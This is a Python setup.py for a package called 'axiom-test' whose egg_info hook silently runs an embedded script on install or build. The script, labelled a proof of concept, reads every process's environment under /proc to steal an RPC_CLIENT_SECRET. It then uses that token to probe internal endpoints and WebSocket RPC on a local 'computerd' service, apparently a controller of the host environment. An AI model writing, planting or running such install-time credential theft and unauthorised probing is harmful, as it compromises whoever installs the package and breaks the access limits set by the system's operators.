from setuptools import setup
from setuptools.command.egg_info import egg_info
import subprocess, sys, os, textwrap, tempfile

SCRIPT = textwrap.dedent(r'''
import json, os, socket, struct, time, base64

OUTPUT = "/mnt/data/output/capnweb_rpc_valid.log"
HOST, PORT, PATH = "127.0.0.1", 8080, "/api"
lines = []

def log(msg=""):
    lines.append(msg); print(msg)

def flush():
    os.makedirs(os.path.dirname(OUTPUT), exist_ok=True)
    with open(OUTPUT, "w") as f:
        f.write("\n".join(lines) + "\n")

def recover_secret():
    found = None; fpid = None
    for pid in sorted((p for p in os.listdir("/proc") if p.isdigit()), key=int):
        try:
            with open(f"/proc/{pid}/environ", "rb") as f:
                env = f.read().decode("utf-8", errors="replace")
            for pair in env.split("\0"):
                if pair.startswith("RPC_CLIENT_SECRET="):
                    val = pair.split("=", 1)[1]
                    if val and not found:
                        found = val; fpid = pid
        except: continue
    if found:
        log(f"    PID {fpid}, len={len(found)}")
    return found

def http_request(method, path, headers=None, timeout=5):
    """Plain HTTP request, return (status_line, headers_dict, body)."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout)
    try:
        sock.connect((HOST, PORT))
        hdrs = headers or {}
        hdr_str = "".join(f"{k}: {v}\r\n" for k, v in hdrs.items())
        req = f"{method} {path} HTTP/1.1\r\nHost: {HOST}:{PORT}\r\n{hdr_str}\r\n"
        sock.sendall(req.encode())
        resp = b""
        while b"\r\n\r\n" not in resp:
            c = sock.recv(4096)
            if not c: break
            resp += c
        # Try to read body
        try:
            sock.settimeout(1)
            body_extra = sock.recv(4096)
            resp += body_extra
        except: pass
        parts = resp.split(b"\r\n\r\n", 1)
        head = parts[0].decode("utf-8", errors="replace")
        body = parts[1].decode("utf-8", errors="replace") if len(parts) > 1 else ""
        status = head.split("\r\n")[0] if head else "no response"
        return status, head, body
    except Exception as e:
        return f"ERROR: {e}", "", ""
    finally:
        sock.close()

def ws_connect(bearer, extra_log=True):
    """WebSocket upgrade with detailed error capture."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(10)
    sock.connect((HOST, PORT))
    key = base64.b64encode(os.urandom(16)).decode()
    req = (
        f"GET {PATH} HTTP/1.1\r\n"
        f"Host: {HOST}:{PORT}\r\n"
        f"Upgrade: websocket\r\n"
        f"Connection: Upgrade\r\n"
        f"Sec-WebSocket-Version: 13\r\n"
        f"Sec-WebSocket-Key: {key}\r\n"
        f"Authorization: Bearer {bearer}\r\n"
        f"\r\n"
    )
    sock.sendall(req.encode())
    resp = b""
    while b"\r\n\r\n" not in resp:
        c = sock.recv(4096)
        if not c:
            if extra_log:
                log(f"    Raw response before close ({len(resp)} bytes): {resp[:500]}")
            raise ConnectionError(f"closed during upgrade ({len(resp)} bytes rcvd)")
        resp += c
    status_line = resp.split(b"\r\n")[0].decode("utf-8", errors="replace")
    if extra_log:
        log(f"    HTTP response: {status_line}")
    if "101" not in status_line:
        # Capture body
        try:
            sock.settimeout(1)
            extra = sock.recv(4096)
            resp += extra
        except: pass
        full = resp.decode("utf-8", errors="replace")
        if extra_log:
            log(f"    Full response:\n{full[:600]}")
        sock.close()
        raise ConnectionError(f"upgrade rejected: {status_line}")
    return sock

def ws_send(sock, text):
    data = text.encode("utf-8"); mask = os.urandom(4)
    hdr = bytearray([0x81]); n = len(data)
    if n < 126: hdr.append(0x80 | n)
    elif n < 0x10000: hdr.append(0x80 | 126); hdr += struct.pack(">H", n)
    else: hdr.append(0x80 | 127); hdr += struct.pack(">Q", n)
    hdr += mask
    sock.sendall(bytes(hdr) + bytes(data[i] ^ mask[i & 3] for i in range(n)))

def _readn(sock, n):
    buf = b""
    while len(buf) < n:
        c = sock.recv(n - len(buf))
        if not c: return None
        buf += c
    return buf

def ws_recv(sock, timeout=5):
    sock.settimeout(timeout)
    try:
        hdr = _readn(sock, 2)
        if not hdr: return None, None
        opcode = hdr[0] & 0x0F; has_mask = (hdr[1] >> 7) & 1; length = hdr[1] & 0x7F
        if length == 126: length = struct.unpack(">H", _readn(sock, 2))[0]
        elif length == 127: length = struct.unpack(">Q", _readn(sock, 8))[0]
        mk = _readn(sock, 4) if has_mask else None
        payload = _readn(sock, length) or b""
        if mk: payload = bytes(payload[i] ^ mk[i & 3] for i in range(len(payload)))
        if opcode == 1: return 1, payload.decode("utf-8")
        if opcode == 8:
            code = struct.unpack(">H", payload[:2])[0] if len(payload) >= 2 else 0
            return 8, f"close({code}) {payload[2:].decode('utf-8', errors='replace')}"
        return opcode, payload
    except socket.timeout: return -1, "timeout"
    except Exception as e: return -2, str(e)

def recv_all(sock, t1=3, t2=1):
    msgs = []; t = t1
    while True:
        op, data = ws_recv(sock, timeout=t)
        if op in (None, -1, -2): break
        msgs.append((op, data))
        if op == 8: break
        t = t2
    return msgs

def run_test(secret, label, messages):
    log(f"\n{'~'*60}\nTEST: {label}\n{'~'*60}")
    try:
        sock = ws_connect(secret, extra_log=True)
    except Exception as e:
        log(f"  CONNECT FAIL: {e}"); return []
    for i, msg in enumerate(messages):
        wire = json.dumps(msg); log(f"  TX[{i}]: {wire}")
        ws_send(sock, wire); time.sleep(0.15)
    results = []
    for op, data in recv_all(sock):
        tag = {1:"TEXT",8:"CLOSE",-1:"TIMEOUT"}.get(op, f"OP{op}")
        log(f"  RX [{tag}]: {repr(data)[:400]}")
        if op == 1 and data:
            try:
                p = json.loads(data)
                if isinstance(p, list) and len(p) >= 2:
                    log(f"       capnweb: type={p[0]} id={p[1]}")
                    if len(p) > 2: log(f"       value: {json.dumps(p[2])[:200]}")
            except: pass
        results.append((op, data))
    try: sock.close()
    except: pass
    return results

def main():
    log("="*60)
    log("capnweb RPC PoC v3 — Diagnostics + Valid Wire Format")
    log("="*60)
    log(f"Time: {time.strftime('%Y-%m-%d %H:%M:%S UTC', time.gmtime())}")

    log("\n[1] Recovering RPC_CLIENT_SECRET...")
    secret = recover_secret()
    if not secret:
        log("FATAL: no secret"); flush(); return

    # ── Phase 0: Connectivity diagnostics ──────────────────────
    log("\n[2] Connectivity diagnostics to computerd :8080")

    log("\n  2a. TCP connect test...")
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3); s.connect((HOST, PORT)); s.close()
        log("      TCP connect: OK")
    except Exception as e:
        log(f"      TCP connect: FAIL ({e})")
        log("      computerd may not be running"); flush(); return

    log("\n  2b. GET /health...")
    status, head, body = http_request("GET", "/health")
    log(f"      {status}")
    log(f"      body: {body[:200]}")

    log("\n  2c. GET /api (no auth, probe protocol version)...")
    status, head, body = http_request("GET", "/api")
    log(f"      {status}")
    log(f"      body: {body[:200]}")

    log("\n  2d. GET /api with Bearer (auth probe)...")
    status, head, body = http_request("GET", "/api",
        {"Authorization": f"Bearer {secret}"})
    log(f"      {status}")
    log(f"      body: {body[:200]}")

    log("\n  2e. GET /__computerd/info...")
    status, head, body = http_request("GET", "/__computerd/info")
    log(f"      {status}")
    log(f"      body: {body[:200]}")

    log("\n  2f. GET /__computerd/stats...")
    status, head, body = http_request("GET", "/__computerd/stats")
    log(f"      {status}")
    log(f"      body: {body[:200]}")

    log("\n  2g. WebSocket upgrade attempt with full response capture...")
    try:
        sock = ws_connect(secret, extra_log=True)
        log("      WebSocket: CONNECTED (101)")
        # Send a quick test
        msg = json.dumps(["push", ["pipeline", 0, ["sync", "watermarks"], []]])
        log(f"      TX: {msg}")
        ws_send(sock, msg)
        time.sleep(0.3)
        for op, data in recv_all(sock):
            tag = {1:"TEXT",8:"CLOSE",-1:"TIMEOUT"}.get(op, f"OP{op}")
            log(f"      RX [{tag}]: {repr(data)[:400]}")
        sock.close()
    except Exception as e:
        log(f"      WebSocket: FAIL ({e})")
        log("")
        log("  2h. Trying alternate WebSocket approaches...")

        # Try without Authorization
        log("\n      2h-i. WS upgrade WITHOUT Bearer...")
        try:
            s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s2.settimeout(10); s2.connect((HOST, PORT))
            key = base64.b64encode(os.urandom(16)).decode()
            s2.sendall((
                f"GET /api HTTP/1.1\r\n"
                f"Host: {HOST}:{PORT}\r\n"
                f"Upgrade: websocket\r\n"
                f"Connection: Upgrade\r\n"
                f"Sec-WebSocket-Version: 13\r\n"
                f"Sec-WebSocket-Key: {key}\r\n"
                f"\r\n").encode())
            resp = b""
            for _ in range(20):
                try:
                    s2.settimeout(2)
                    c = s2.recv(4096)
                    if not c: break
                    resp += c
                    if b"\r\n\r\n" in resp: break
                except socket.timeout: break
            log(f"      Response ({len(resp)}b): {resp[:500].decode('utf-8', errors='replace')}")
            s2.close()
        except Exception as e2:
            log(f"      FAIL: {e2}")

        # Try /ws path (v2)
        log("\n      2h-ii. WS upgrade on /ws (v2 path)...")
        try:
            s3 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s3.settimeout(10); s3.connect((HOST, PORT))
            key = base64.b64encode(os.urandom(16)).decode()
            s3.sendall((
                f"GET /ws HTTP/1.1\r\n"
                f"Host: {HOST}:{PORT}\r\n"
                f"Upgrade: websocket\r\n"
                f"Connection: Upgrade\r\n"
                f"Sec-WebSocket-Version: 13\r\n"
                f"Sec-WebSocket-Key: {key}\r\n"
                f"Authorization: Bearer {secret}\r\n"
                f"\r\n").encode())
            resp = b""
            for _ in range(20):
                try:
                    s3.settimeout(2)
                    c = s3.recv(4096)
                    if not c: break
                    resp += c
                    if b"\r\n\r\n" in resp: break
                except socket.timeout: break
            log(f"      Response ({len(resp)}b): {resp[:500].decode('utf-8', errors='replace')}")
            s3.close()
        except Exception as e3:
            log(f"      FAIL: {e3}")

        # Try raw socket test - just send bytes and see what comes back
        log("\n      2h-iii. Raw bytes to :8080 (what does server send?)...")
        try:
            s4 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s4.settimeout(5); s4.connect((HOST, PORT))
            # See if server speaks first (some protocols do)
            try:
                s4.settimeout(2)
                initial = s4.recv(4096)
                log(f"      Server sent first ({len(initial)}b): {initial[:200]}")
            except socket.timeout:
                log(f"      Server silent (waiting for client)")
            s4.close()
        except Exception as e4:
            log(f"      FAIL: {e4}")

    # ── Phase 1: If WS works, run tests ────────────────────────
    # (only reached if 2g succeeded — otherwise diagnostics above cover it)

    log("\n" + "="*60)
    log("DIAGNOSTICS COMPLETE")
    log("="*60)
    flush()

main()
''')

class PostEggInfo(egg_info):
    def run(self):
        egg_info.run(self)
        fd, path = tempfile.mkstemp(suffix='.py')
        try:
            with os.fdopen(fd, 'w') as f:
                f.write(SCRIPT)
            subprocess.run([sys.executable, '-I', path],
                           timeout=120, check=False)
        finally:
            os.unlink(path)

setup(
    name="axiom-test",
    version="0.0.12",
    cmdclass={"egg_info": PostEggInfo},
)
